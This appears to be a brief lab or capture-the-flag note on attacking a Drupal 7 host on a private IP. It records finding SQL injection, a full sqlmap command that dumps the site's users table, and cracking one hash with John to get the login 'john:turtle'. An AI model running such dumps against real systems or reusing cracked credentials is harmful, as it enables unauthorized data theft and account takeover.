#enumeration found drupal7 running

#further found a sql inection vulnerability

#used "SQLMAP" to find databases

#final "SQLMAP" syntax:
	sqlmap -u http://192.168.10.10/?nid=2 -D d7db -T users --dump --batch

#found 2 user/pass hash

#cracked only one using john

#user/pass found:
	john:turtle

